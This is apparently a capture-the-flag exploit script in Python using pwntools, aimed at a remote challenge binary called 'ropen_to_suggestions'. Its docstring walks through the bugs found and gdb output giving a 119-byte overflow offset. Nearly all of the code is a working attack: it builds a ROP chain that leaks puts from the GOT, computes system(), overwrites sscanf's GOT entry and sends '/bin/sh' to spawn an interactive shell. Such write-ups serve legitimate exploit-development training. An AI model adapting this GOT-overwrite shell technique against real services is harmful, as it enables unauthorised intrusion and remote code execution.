#!/usr/bin/env python2

"""
Off-by-one error when calling the fptr for global thermonuclear war. It uses
functions[8] as the fptr when functions is only 8 pointers long. functions[8]
is intro[0], however we can't get a valid fptr here without another exploit.
Turns out this isn't exploitable on its own.

Chemical also has a partially controlled buffer overflow. *Very* hard to get
a useful primitive though because we can only get a partial overwrite of RBP,
and the program crashes almost immediately. Additionally, we only partially
control the contents of the overflowed data.

The fighter program has a straight forward stack based buffer overflow with
no canaries. This is the exploitable bug I took advantage of.

Program received signal SIGSEGV, Segmentation fault.
0x0000004200001509 in sword () from ./fighter.so
=> 0x0000004200001509 <sword+387>:  c3  ret
(gdb) x/gx $rsp
0x7ffd026fc758: 0x6161676261616662
(gdb) !cyclic -l 0x61616662
119

All modules are based at static addresses (not PIC), so we don't even need a
leak to use them for ROP gadgets!. Create a ROP chain to read the address from
puts.got into RDI, compute the address of system, and then overwrite sscanf.got
with that. After overwriting sscanf, return back to the choose_option function
in the main program. This will call fgets(s, 500), followed by sscanf(s, ...).
Specify "/bin/sh" to trigger system("/bin/sh").
"""

from pwn import *

conn = remote("challenge.acictf.com", 31803)
#conn = process("./ropen_to_suggestions")

elf = ELF("./ropen_to_suggestions")
libc = ELF("./libc.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#gdb.attach(conn, "b *0x4200001509\nc")

#context.log_level = "debug"

CHOOSE_OPTION = 0x4009e6
POP_RDI = 0x400dd3
POP_RSI = 0x4100000819          # tictactoe
ADD_RDI_RSI = 0x4400001480      # dessert
MOV_RDI_MRSI = 0x44000014c0
MOV_MRSI_RDI = 0x44000014c4


def intro():
    conn.recvuntil("FALKEN.\n")
    conn.sendline("")
    conn.recvuntil("TODAY?\n")
    conn.sendline("")
    conn.recvuntil("1973.\n")
    conn.sendline("PEOPLE SOMETIMES MAKE MISTAKES")
    conn.recvuntil("GLOBAL THERMONUCLEAR WAR\n\n")

    # Load tictactoe.so and dessert.so for ROP gadgets
    conn.sendline("2")  # tictactoe
    conn.recvuntil("players?\n\n")
    conn.sendline("1")  # invalid num players to return to main menu
    conn.recvuntil("GLOBAL THERMONUCLEAR WAR\n\n")

    conn.sendline("5")  # dessert
    conn.recvuntil("6) Return to Main Menu\n\n")
    conn.sendline("6")
    conn.recvuntil("GLOBAL THERMONUCLEAR WAR\n\n")


def main():
    intro()

    # FIGHTER COMBAT
    conn.sendline("3")
    conn.recvuntil("Return to Main Menu\n\n")
    conn.sendline("4")  # sword fight
    conn.recvuntil("S) Saber\n")

    # Build a ROP payload to ret to system
    puts_system_offset = libc.symbols["system"] - libc.symbols["puts"]
    log.info("puts_system_offset: 0x{:x}".format(puts_system_offset))
    if puts_system_offset < 0:
        puts_system_offset += 1 << 64   # Convert to 2's complement negative for p64

    # read puts.got into RDI
    rop = p64(POP_RSI)
    rop += p64(elf.got["puts"])
    rop += p64(MOV_RDI_MRSI)
    # compute system in RDI
    rop += p64(POP_RSI)
    rop += p64(puts_system_offset)
    rop += p64(ADD_RDI_RSI)
    # store system() at __isoc99_sscanf.got
    rop += p64(POP_RSI)
    rop += p64(elf.got["__isoc99_sscanf"])
    rop += p64(MOV_MRSI_RDI)
    # ret back to choose_option in the main program to trigger
    rop += p64(CHOOSE_OPTION)

    log.info("Sending ROP payload")
    conn.sendline("S" + "a"*119 + rop)
    conn.recvuntil("GLOBAL THERMONUCLEAR WAR\n\n")

    log.info("Triggering overwritten sscanf with /bin/sh")
    conn.sendline("/bin/sh")
    conn.interactive()


if __name__ == "__main__":
    main()
